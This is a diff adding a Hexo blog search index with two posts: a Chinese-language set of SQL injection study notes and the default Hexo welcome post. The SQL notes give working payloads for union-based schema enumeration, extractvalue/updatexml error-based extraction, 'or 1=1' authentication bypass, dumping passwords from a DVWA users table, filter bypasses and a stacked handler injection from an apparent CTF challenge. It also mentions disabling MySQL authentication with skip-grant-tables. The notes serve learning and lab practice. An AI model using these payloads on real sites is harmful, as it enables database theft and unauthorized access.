@@ -1,0 +1,140 @@
+<?xml version="1.0" encoding="utf-8"?>
+<search>
+  <entry>
+    <title>SQL注入</title>
+    <url>/2024/03/19/SQL%E6%B3%A8%E5%85%A5/</url>
+    <content><![CDATA[<p>这篇文章什么都没有</p>
+<span id="more"></span>
+
+<p><a name="Fqj1f"></a></p>
+<h1 id="一个搞了一晚上的坑"><a href="#一个搞了一晚上的坑" class="headerlink" title="一个搞了一晚上的坑"></a>一个搞了一晚上的坑</h1><p>使用SQLyog时连接不上出现1045错误,然后按照搜索出来的方法,打开PHP study关闭他的MYSQL在MYSQL文件内找到my.ini打开文件查找到 [mysqld] ，在其下方添加上一行 skip-grant-tables，然后保存。再重启MYSQL即可连接成功<br><a name="rOGYv"></a></p>
+<h2 id="命令行"><a href="#命令行" class="headerlink" title="命令行"></a>命令行</h2><p>– :注释<br />id&#x3D;1’报错即为字符型注入<br />要找到注入点<br />order by 后面加数字<br />group by + 数字,确定列数</p>
+<blockquote>
+<p>-1’ union select 1,database()# 前面的-1 空出回显位</p>
+</blockquote>
+<p><a name="NrwJo"></a></p>
+<h1 id="表名"><a href="#表名" class="headerlink" title="表名"></a>表名</h1><ul>
+<li>information_schema</li>
+</ul>
+<p><code>SCHEMATA</code>表,当前root中所有数据库的信息,一般用来查到表名<br /><code>TABLES</code>表:记录用户所有数据库名(TABLE_SCHEMA)和表名(TABLE_NAME)<br /><code>columns</code>表:提供表中的列信息<br>:::danger<br>首先确定注入点–&gt;找到回显位置–&gt;<br>:::<br><a name="QegFW"></a></p>
+<h1 id="floor-报错"><a href="#floor-报错" class="headerlink" title="floor()报错"></a>floor()报错</h1><p><a name="LfLDf"></a></p>
+<h1 id="extractValue报错"><a href="#extractValue报错" class="headerlink" title="extractValue报错"></a>extractValue报错</h1><blockquote>
+<p>?id&#x3D;-1’ union select 1,2,extractvalue(1,concat(0x7e,(select database()))),3 –+</p>
+</blockquote>
+<p>extractValue(列名,’&#x2F;查询内容路径&#x2F;‘)当斜号改成别的符号,就会报错执行回显</p>
+<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> extractvalue(doc,concat(<span class="number">0x7e</span>,(<span class="keyword">select</span> database())));</span><br></pre></td></tr></table></figure>
+<p>conccat拼接,0x7e是~的编译,extractvalue括号内的内容即为正常查询的内容,但是默认只返回32个字符<br />substring(内容,从哪个字符开始显示,一次显示几个字符)</p>
+<blockquote>
+<p>?id&#x3D;-1’ union select 1,2,extractvalue(1,concat(0x7e,(select database()))),3 –+</p>
+</blockquote>
+<p><a name="RDvii"></a></p>
+<h1 id="updatexml报错"><a href="#updatexml报错" class="headerlink" title="updatexml报错"></a>updatexml报错</h1><p>updatexml(‘XML_document’,’Xpath_string’,’New_value’)<br />&#x2F;&#x2F;即<br />updatexml(‘目标xml文件名’,’在xml中查询的字符串’,’替换后的值’)</p>
+<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">and</span> updatexml(<span class="number">1</span>,concat(<span class="number">0x7e</span>,database()),<span class="number">0</span>)<span class="operator">/</span><span class="operator">/</span><span class="keyword">select</span> 语句需要用括号括起来</span><br></pre></td></tr></table></figure>
+<blockquote>
+<p>?id&#x3D;1’ and updatexml(1,’~’,3) – a 判断是否为报错注入</p>
+</blockquote>
+<p><a name="HVH8e"></a></p>
+<h1 id="SQL注入"><a href="#SQL注入" class="headerlink" title="SQL注入"></a>SQL注入</h1><p><a name="OUtke"></a></p>
+<h2 id="数据库"><a href="#数据库" class="headerlink" title="数据库"></a>数据库</h2><ul>
+<li>information_schema</li>
+</ul>
+<p><code>SCHEMATA</code>表,当前root中所有数据库的信息,一般用来查到表名<br /><code>TABLES</code>表:记录用户所有数据库名(TABLE_SCHEMA)和表名(TABLE_NAME)<br /><code>columns</code>表:提供表中的列信息<br><a name="L9a4W"></a></p>
+<h2 id="命令"><a href="#命令" class="headerlink" title="命令"></a>命令</h2><p><a name="mnggm"></a></p>
+<h3 id="SELECT-WHERE"><a href="#SELECT-WHERE" class="headerlink" title="SELECT WHERE"></a>SELECT WHERE</h3><p>语法<br />SELECT column_name,column_name（列名称）<br />FROM table_name（表名称）<br />WHERE column_name operator value;字段名称，数据满足什么条件类似if语句<br />（if（。。。。&#x3D;。。<br />printf(…)<br />）<br /><img src="https://cdn.nlark.com/yuque/0/2023/png/34873733/1674294315668-0d9b9c0a-e317-45eb-bac5-89871ef6bc93.png#averageHue=%23cdc0a4&clientId=u2f371465-feeb-4&from=paste&height=314&id=u78d7e8b3&originHeight=471&originWidth=1503&originalType=binary&ratio=1&rotation=0&showTitle=false&size=232927&status=done&style=none&taskId=ueda2f8f8-2896-45f3-ac15-a08bd2fdde2&title=&width=1002" alt="image.png"><br><a name="htdLX"></a></p>
+<h3 id="CREATE-DEATABASE语句-创建数据库"><a href="#CREATE-DEATABASE语句-创建数据库" class="headerlink" title="CREATE DEATABASE语句,创建数据库"></a>CREATE DEATABASE语句,创建数据库</h3><p> 在 MySQL 中，可以使用 CREATE DATABASE 语句创建数据库，语法格式如下：<br />CREATE DATABASE [IF NOT EXISTS] &lt;数据库名&gt;<br />[[DEFAULT] CHARACTER SET &lt;字符集名&gt;] <br />[[DEFAULT] COLLATE &lt;校对规则名&gt;];<br />[ ]中的内容是可选的。语法说明如下：<br />&lt;数据库名&gt;：创建数据库的名称。MySQL 的数据存储区将以目录方式表示 MySQL 数据库，因此数据库名称必须符合操作系统的文件夹命名规则，不能以数字开头，尽量要有实际意义。注意在 MySQL 中不区分大小写。<br />IF NOT EXISTS：在创建数据库之前进行判断，只有该数据库目前尚不存在时才能执行操作。此选项可以用来避免数据库已经存在而重复创建的错误。<br />[DEFAULT] CHARACTER SET：指定数据库的字符集。指定字符集的目的是为了避免在数据库中存储的数据出现乱码的情况。如果在创建数据库时不指定字符集，那么就使用系统的默认字符集。<br />[DEFAULT] COLLATE：指定字符集的默认校对规则。  <br /><img src="https://cdn.nlark.com/yuque/0/2023/png/34873733/1674804138075-58e5675c-2a2f-41b9-8931-bc60d4b23b9d.png#averageHue=%23fcfcfb&clientId=u2f371465-feeb-4&from=paste&height=575&id=ue5ce2067&originHeight=862&originWidth=1541&originalType=binary&ratio=1&rotation=0&showTitle=false&size=306752&status=done&style=none&taskId=u50c5a863-b049-4715-b227-cc4a2cc9d97&title=&width=1027.3333333333333" alt="image.png"><br />创建完后刷新一下侧边栏才能看到<br><a name="Cy5wM"></a></p>
+<h3 id="creat-table-创建表"><a href="#creat-table-创建表" class="headerlink" title="creat table 创建表"></a>creat table 创建表</h3><p> create 表名(<br />列名1  定义字段的数据类型 ， <br />列名2  类型，<br />列名3 类型）<br />一个简单的建表格式，其中：</p>
+<ul>
+<li>字符串类型（char，varchar）需要指定长度；</li>
+<li>整型（int，biging，tinyint等）和日期类型（datetime，timestamp等）只需要指定类型，不需要指定长度；</li>
+<li>decimal类型需要指定精度和小数位数。</li>
+</ul>
+<p><img src="https://cdn.nlark.com/yuque/0/2023/png/34873733/1674806102179-29f5ef6b-cd00-4ab9-9dc3-dd0e736e37da.png#averageHue=%23fcfbfa&clientId=u2f371465-feeb-4&from=paste&height=455&id=uecda8fd9&originHeight=682&originWidth=1279&originalType=binary&ratio=1&rotation=0&showTitle=false&size=119001&status=done&style=none&taskId=uc6482fe7-a51c-42d3-ac5b-4f84d0481b8&title=&width=852.6666666666666" alt="image.png"><br><a name="UPOvG"></a></p>
+<h3 id="数据插入，增"><a href="#数据插入，增" class="headerlink" title="数据插入，增"></a>数据插入，增</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">INSERT INTO TABLE_NAME (column1, column2, column3,...columnN)</span><br><span class="line">VALUES (value1, value2, value3,...valueN);</span><br><span class="line">//table_name 表名</span><br><span class="line">colimn 字段名</span><br><span class="line">value 字段数据</span><br></pre></td></tr></table></figure>
+<p>写明column就会一一对应，没写就会按照顺序依次赋值<br />注字符要用单引号，否则会报错<br /><img src="https://cdn.nlark.com/yuque/0/2023/png/34873733/1674807157319-c8e1f44c-89da-4ece-a791-2e8ddbda06c6.png#averageHue=%23faf9f8&clientId=u2f371465-feeb-4&from=paste&height=450&id=u935da9de&originHeight=675&originWidth=1387&originalType=binary&ratio=1&rotation=0&showTitle=false&size=115187&status=done&style=none&taskId=u2e990afe-0011-4b1f-a614-e4e963a360d&title=&width=924.6666666666666" alt="image.png"><br />这样就创建成功了使用select*from t1即可查看<br><a name="ypsAF"></a></p>
+<h3 id="删"><a href="#删" class="headerlink" title="删"></a>删</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">DELETE FROM table_name//表名</span><br><span class="line">WHERE some_column=some_value;//条件</span><br></pre></td></tr></table></figure>
+<p> 用于删除表中的行<br /><img src="https://cdn.nlark.com/yuque/0/2023/png/34873733/1674807923384-c02acfcf-f9b4-4841-badb-16cbd9986efa.png#averageHue=%23dccba9&clientId=u2f371465-feeb-4&from=paste&height=318&id=u5ada8352&originHeight=477&originWidth=689&originalType=binary&ratio=1&rotation=0&showTitle=false&size=89935&status=done&style=none&taskId=udf437a7d-efbf-4319-9915-1775cba1de5&title=&width=459.3333333333333" alt="image.png"><br><a name="klCG4"></a></p>
+<h3 id="改，update"><a href="#改，update" class="headerlink" title="改，update"></a>改，update</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">UPDATE table_name</span><br><span class="line">SET column1字段名=value1字段数据,column2=value2,...//更改操作</span><br><span class="line">WHERE some_column=some_value;//条件判断</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p><img src="https://cdn.nlark.com/yuque/0/2023/png/34873733/1674808437657-072df0a6-c90a-4865-8a58-25816de8ee4f.png#averageHue=%23f9f8f6&clientId=u2f371465-feeb-4&from=paste&height=370&id=u06745ca2&originHeight=555&originWidth=1203&originalType=binary&ratio=1&rotation=0&showTitle=false&size=101076&status=done&style=none&taskId=ucc811189-cd89-4280-942f-63e41b1b445&title=&width=802" alt="image.png"><br><a name="LZw8u"></a></p>
+<h3 id="and-和or-运算符"><a href="#and-和or-运算符" class="headerlink" title="and 和or 运算符"></a>and 和or 运算符</h3><p><img src="https://cdn.nlark.com/yuque/0/2023/png/34873733/1674808606487-069b3aa9-9431-456b-ad6c-f65e69ad0df1.png#averageHue=%23e0d2a9&clientId=u2f371465-feeb-4&from=paste&height=191&id=u53b885e1&originHeight=286&originWidth=890&originalType=binary&ratio=1&rotation=0&showTitle=false&size=59069&status=done&style=none&taskId=udf8e9d1b-d70d-452e-9fee-a8abaae2d12&title=&width=593.3333333333334" alt="image.png"><br /><img src="https://cdn.nlark.com/yuque/0/2023/png/34873733/1674808646431-f07c0f76-62a7-451e-b345-53d5517dea22.png#averageHue=%23dfd1a9&clientId=u2f371465-feeb-4&from=paste&height=190&id=uf102ef80&originHeight=285&originWidth=921&originalType=binary&ratio=1&rotation=0&showTitle=false&size=60551&status=done&style=none&taskId=u80e42f2c-699a-4ec5-b90d-0c9f5fcd138&title=&width=614" alt="image.png"><br />or语句，当判断结果为真就会全部查询出来，也就是万能钥匙<br /><img src="https://cdn.nlark.com/yuque/0/2023/png/34873733/1674808762997-ff23c1dc-2dc4-45c8-8d94-d29308e239cd.png#averageHue=%23dcceaa&clientId=u2f371465-feeb-4&from=paste&height=280&id=u25b4c6ad&originHeight=420&originWidth=853&originalType=binary&ratio=1&rotation=0&showTitle=false&size=76570&status=done&style=none&taskId=u830277e8-bfd0-4190-b97b-c683eccae46&title=&width=568.6666666666666" alt="image.png"><br><a name="oLcui"></a></p>
+<h3 id="union多表联合查询"><a href="#union多表联合查询" class="headerlink" title="union多表联合查询"></a>union多表联合查询</h3><p><img src="https://cdn.nlark.com/yuque/0/2023/png/34873733/1674809098617-aa9c7c8b-a544-4e54-9787-bfe302553fac.png#averageHue=%23dfd1a6&clientId=u2f371465-feeb-4&from=paste&height=225&id=uf9f0febc&originHeight=338&originWidth=1293&originalType=binary&ratio=1&rotation=0&showTitle=false&size=74377&status=done&style=none&taskId=u6b96d398-a33e-49ee-9af8-ec856df55ea&title=&width=862" alt="image.png"><br />结果直接拼接显示， union可以对同一个表的两次查询联合起来<br /><img src="https://cdn.nlark.com/yuque/0/2023/png/34873733/1674809314176-650e03a1-5400-4dbc-b209-de01b00b86c4.png#averageHue=%23dfd1a8&clientId=u2f371465-feeb-4&from=paste&height=214&id=u5a06fab2&originHeight=321&originWidth=1042&originalType=binary&ratio=1&rotation=0&showTitle=false&size=66615&status=done&style=none&taskId=u249e79c5-d475-448f-a5ae-8ebec32b5ee&title=&width=694.6666666666666" alt="image.png"><br />用来猜测字段<br><a name="Ok6BN"></a></p>
+<h3 id="SQL注入-1"><a href="#SQL注入-1" class="headerlink" title="SQL注入"></a>SQL注入</h3><p><a name="HzRP5"></a></p>
+<h4 id="数字型注入"><a href="#数字型注入" class="headerlink" title="数字型注入"></a>数字型注入</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select * from t1 where id= x</span><br></pre></td></tr></table></figure>
+<p>x&#x3D;1 or 1&#x3D;1(万能密码）<br />x&#x3D;1 union select 1,2,3…..(一个个尝试出字段)<br><a name="jOrv3"></a></p>
+<h4 id="字符型注入"><a href="#字符型注入" class="headerlink" title="字符型注入"></a>字符型注入</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select * from t1 where name= &#x27;x&#x27;</span><br></pre></td></tr></table></figure>
+<p>x&#x3D;1’ or 1&#x3D;1 #—注释掉后面多出来的单引号<br><a name="pAeOV"></a></p>
+<h4 id="解题步骤"><a href="#解题步骤" class="headerlink" title="解题步骤"></a>解题步骤</h4><p>通常情况下，可能存在 Sql 注入漏洞的 Url 是类似这种形式 ：<a href="http://xxx.xxx.xxx/abcd.php?id=XX">http://xxx.xxx.xxx/abcd.php?id=XX</a></p>
+<ul>
+<li>判断注入点(是否存在sql注入,如果存在属于哪种注入)</li>
+<li>判断是否存在漏洞( 最为经典的<strong>单引号判断法</strong>：在参数后面加上单引号, 如果页面返回错误，则存在 Sql 注入。<br />原因是无论字符型还是整型都会因为单引号个数不匹配而报错。如果未报错，不代表不存在 Sql 注入，因为有可能页面对单引号做了过滤)</li>
+<li>判断注入类型<br><a name="LVmdK"></a></li>
+</ul>
+<h3 id="GROUP-CONCAT-函数"><a href="#GROUP-CONCAT-函数" class="headerlink" title="GROUP_CONCAT()函数"></a>GROUP_CONCAT()函数</h3><p>将多个字符串拼接成一个字符串<br /><img src="https://cdn.nlark.com/yuque/0/2023/png/34873733/1674810905399-4d34761c-1974-43c4-8df6-19d52aaa7042.png#averageHue=%23d9cfa8&clientId=u2f371465-feeb-4&from=paste&height=238&id=u5f30fef9&originHeight=357&originWidth=847&originalType=binary&ratio=1&rotation=0&showTitle=false&size=75283&status=done&style=none&taskId=u1e79e750-5836-4670-9b35-0e0cd01b12d&title=&width=564.6666666666666" alt="image.png"><br><a name="IKhG1"></a></p>
+<h3 id="联合查询"><a href="#联合查询" class="headerlink" title="联合查询"></a>联合查询</h3><p><code>字段数-&gt;回显位置-&gt;查阅库名-&gt;表名-&gt;字段名-&gt;查阅数据</code></p>
+<ul>
+<li>查库名</li>
+</ul>
+<p>SELECT DATABASE();– 能够知道当前在哪个数据库<br />select information_schema.<code>SCHEMATA</code><br /><strong>查询所有库名:</strong></p>
+<blockquote>
+<p>‘ union select 1,group_concat(schema_name) from information_schema.schemata – ‘</p>
+</blockquote>
+<blockquote>
+<p>-1’ union select 1,database()#</p>
+</blockquote>
+<p><strong>查表名</strong></p>
+<blockquote>
+<p>‘ union select 1,group_concat(table_name) from information_schema.tables where table_schema&#x3D;’数据库的名称’#</p>
+</blockquote>
+<blockquote>
+<p>1’ union select 1,2,group_concat(table_name) from information_schema.tables where table_schema&#x3D;database() –+</p>
+</blockquote>
+<p><strong>查字段</strong></p>
+<blockquote>
+<p>‘ union select 1,group_concat(column_name) from information_schema.columns where table_name&#x3D;’users’</p>
+</blockquote>
+<p><strong>查获取字段信息</strong></p>
+<blockquote>
+<p>‘ union select 1,group_concat(password) from dvwa.users – ‘</p>
+</blockquote>
+<p><a name="pDTCa"></a></p>
+<h3 id="空格绕过"><a href="#空格绕过" class="headerlink" title="空格绕过"></a>空格绕过</h3><p>&#x2F;**&#x2F;<br />%09<br />%0a等,详情参考命令执行绕过<br><a name="ti7bT"></a></p>
+<h3 id="实操"><a href="#实操" class="headerlink" title="实操"></a>实操</h3><p>– 注释符<br />#<br />&#x2F;**&#x2F;– 一般可以用来绕过空格<br />SHOW DATABASES; – 显示MySQL所有数据库名称<br />SHOW TABLES; – 显示当前数据库中所有表的名称<br />SHOW TABLES FROM sys; – 作用同上 from后面加数据库名<br />– use 数据库名 如果数据库存在，选择进入该数据库<br />USE mysql;<br />#select 查询数据,展示<br />SELECT DATABASE();– 能够知道当前在哪个数据库<br />SELECT VERSION(); – 查询当前数据库版本，知道存在的漏洞<br />SELECT USER(); – 查询用户名<br /># *代指所有的意思<br />#SELECT 列名称,列名称 FROM 表名称 – （从表中读取几列）<br />SELECT *（即所有的列） FROM TABLES;<br />SELECT TABLE_CATALOG FROM TABLES;<br />SELECT * FROM SCHEMATA ;– 当前root中所有数据库的信息<br />SELECT * FROM COLUMNS  – 能够看到属于哪个表，哪个数据库<br><a name="WV575"></a></p>
+<h1 id="截断函数"><a href="#截断函数" class="headerlink" title="截断函数"></a>截断函数</h1><p>位数不足,需要使用截断函数进行绕过<br /> substr，right，REVERSE  ,mid函数<br /><strong>SUBSTR (str, pos, len)</strong><br />参数说明:</p>
+<ul>
+<li>str为列名&#x2F;字符串；</li>
+<li>pos为起始位置；mysql中的起始位置pos是从1开始的；如果为正数，就表示从正数的位置往下截取字符串（起始坐标从1开始），反之如果起始位置pos为负数，那么 表示就从倒数第几个开始截取；</li>
+<li>len为截取字符个数&#x2F;长度。</li>
+</ul>
+<p>RIGHT(string, number_of_chars)从右侧开始读取,前一个为字符串,后一个为读取的字符数量<br />REVERSE(string)反转字符串<br />MID(string, start, length)中间为从第几位开始,最后为读取的数量<br><a name="rvOk7"></a></p>
+<h1 id="堆叠注入"><a href="#堆叠注入" class="headerlink" title="堆叠注入"></a>堆叠注入</h1><p>堆叠注入原理:利用分号作为结束符,执行多条语句<br />首先判断注入类型<br /><img src="https://cdn.nlark.com/yuque/0/2024/png/34873733/1706444571064-b7f92ad2-6d26-4eb2-a44c-2bd348882f3e.png#averageHue=%23fafafa&clientId=u809d023a-9013-4&from=paste&height=548&id=ubad442f7&originHeight=822&originWidth=1627&originalType=binary&ratio=1.5&rotation=0&showTitle=false&size=54681&status=done&style=none&taskId=u48e92237-1a53-4400-899a-8e8576a161d&title=&width=1084.6666666666667" alt="image.png"><br />为字符型<br /><img src="https://cdn.nlark.com/yuque/0/2024/png/34873733/1706444627314-dabb80cc-d2a1-48e7-bec7-3b3d10846405.png#averageHue=%23fafafa&clientId=u809d023a-9013-4&from=paste&height=503&id=u555acd2e&originHeight=755&originWidth=974&originalType=binary&ratio=1.5&rotation=0&showTitle=false&size=39471&status=done&style=none&taskId=u98c1766d-a86b-4cd5-a533-7b0b993d493&title=&width=649.3333333333334" alt="image.png"><br />判断长度为2<br /><img src="https://cdn.nlark.com/yuque/0/2024/png/34873733/1706444663785-9a67cd93-fe3c-4cb9-abd1-87e90d7c2c25.png#averageHue=%23f9f9f9&clientId=u809d023a-9013-4&from=paste&height=493&id=uba2839be&originHeight=739&originWidth=992&originalType=binary&ratio=1.5&rotation=0&showTitle=false&size=38232&status=done&style=none&taskId=ueda4f061-d01f-4baf-bb08-23c1fca6b54&title=&width=661.3333333333334" alt="image.png"><br />select被过滤,结合题目,尝试堆叠注入<br /><img src="https://cdn.nlark.com/yuque/0/2024/png/34873733/1706444793852-f5deee4d-7b21-4961-a6b8-e5739c12eee9.png#averageHue=%23f6f6f6&clientId=u809d023a-9013-4&from=paste&height=637&id=u4afe72d3&originHeight=956&originWidth=1399&originalType=binary&ratio=1.5&rotation=0&showTitle=false&size=93468&status=done&style=none&taskId=ua9a0e5c3-c9c6-4512-b00c-44a2a2ad8d2&title=&width=932.6666666666666" alt="image.png"><br />用show tables产看当前数据库的表名<br />之后再用<code>show columns form+</code>表名&#96;&#96;查看每个表里面的字段名<br /><img src="https://cdn.nlark.com/yuque/0/2024/png/34873733/1706445028757-7d54fb3f-a99c-49a0-8f44-f175ccc22592.png#averageHue=%23f9f9f9&clientId=u809d023a-9013-4&from=paste&height=521&id=u4e8098e2&originHeight=782&originWidth=1371&originalType=binary&ratio=1.5&rotation=0&showTitle=false&size=65230&status=done&style=none&taskId=uaae8720b-847b-4bfd-ae1a-7fa61247e44&title=&width=914" alt="image.png"><br />由于select被过滤了,大写无法绕过,因此换用另一种方法来读取内容<br><a name="vI7of"></a></p>
+<h2 id="handler-句柄"><a href="#handler-句柄" class="headerlink" title="handler(句柄)"></a>handler(句柄)</h2><p>类似于指针,通过得到的表名,读取表的内容</p>
+<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">#打开句柄</span><br><span class="line">handler handler_table <span class="keyword">open</span>;</span><br><span class="line"># 获取第一行数据</span><br><span class="line">handler p read handler_index <span class="keyword">first</span>;</span><br><span class="line"># 获取下一行数据</span><br><span class="line">handler p read handler_index next;</span><br><span class="line"># 获取上一行数据</span><br><span class="line">handler p read handler_index prev;</span><br><span class="line"># 获取最后一行数据</span><br><span class="line">handler p read handler_index <span class="keyword">last</span>;</span><br><span class="line"># 关闭句柄</span><br><span class="line">handler p <span class="keyword">close</span>;</span><br><span class="line">p指代表名</span><br></pre></td></tr></table></figure>
+<p>payload<br /><code>?inject=-1&#39;;handler </code>1919810931114514<code>open;handler</code>1919810931114514<code>read first; --+</code><br /><img src="https://cdn.nlark.com/yuque/0/2024/png/34873733/1706445410964-032c03e6-ee8b-4bd2-9c26-34b947ce1264.png#averageHue=%23f9f9f9&clientId=u809d023a-9013-4&from=paste&height=475&id=ucc22305a&originHeight=712&originWidth=1802&originalType=binary&ratio=1.5&rotation=0&showTitle=false&size=56810&status=done&style=none&taskId=u854ae8fc-4f0f-43cd-bcdf-7847954f94c&title=&width=1201.3333333333333" alt="image.png"></p>
+]]></content>
+      <categories>
+        <category>SQL</category>
+      </categories>
+      <tags>
+        <tag>SQL</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>Hello World</title>
+    <url>/2024/03/19/hello-world/</url>
+    <content><![CDATA[<p>Welcome to <a href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p>
+<span id="more"></span>
+
+<h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo new <span class="string">&quot;My New Post&quot;</span></span><br></pre></td></tr></table></figure>
+
+<p>More info: <a href="https://hexo.io/docs/writing.html">Writing</a></p>
+<h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo server</span><br></pre></td></tr></table></figure>
+
+<p>More info: <a href="https://hexo.io/docs/server.html">Server</a></p>
+<h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo generate</span><br></pre></td></tr></table></figure>
+
+<p>More info: <a href="https://hexo.io/docs/generating.html">Generating</a></p>
+<h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo deploy</span><br></pre></td></tr></table></figure>
+
+<p>More info: <a href="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p>
+]]></content>
+  </entry>
+</search>
